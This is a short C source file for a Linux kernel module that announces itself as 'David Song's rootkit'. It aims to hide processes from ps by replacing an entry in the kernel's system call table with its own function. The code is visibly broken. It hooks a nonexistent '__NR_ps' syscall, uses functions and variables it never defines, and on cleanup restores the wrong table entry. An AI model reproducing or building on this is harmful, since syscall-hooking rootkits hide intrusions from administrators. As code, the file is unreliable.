#include <linux/kernel.h>	/* We're doing kernel work */
#include <linux/module.h>	/* Specifically, a module, */
#include <linux/moduleparam.h>	/* which will have params */
#include <linux/unistd.h>	/* The list of system calls */

#include <linux/sched.h>
#include <asm/uaccess.h>

extern void *sys_call_table[];

static char input[63];
module_param(input, char*, 0644);

asmlinkage int (*original_call) (const char *, int, int);

int init_module()
{
	printk(KERN_ALERT "David Song's rootkit starting\n");
	printk(KERN_ALERT "Will change the ps command\n");
	printk(KERN_ALERT "To hide certain processes\n");
	/* 
	 * Keep a pointer to the original function in
	 * original_call, and then replace the system call
	 * in the system call table with our_sys_ps 
	 */
	original_call = sys_call_table[__NR_ps];
	sys_call_table[__NR_ps] = our_sys_ps;

	/* 
	 * To get the address of the function for system
	 * call foo, go to sys_call_table[__NR_foo]. 
	 */

	printk(KERN_INFO "Hiding process: %s\n", proc);

	return 0;
}

/* 
 * Cleanup - unregister the appropriate file from /proc 
 */
void cleanup_module()
{
	/* 
	 * Return the system call back to normal 
	 */
	if (sys_call_table[__NR_ps] != our_sys_ps) {
		printk(KERN_ALERT "Removing David's rootkit");
	}

	sys_call_table[__NR_open] = original_call;
}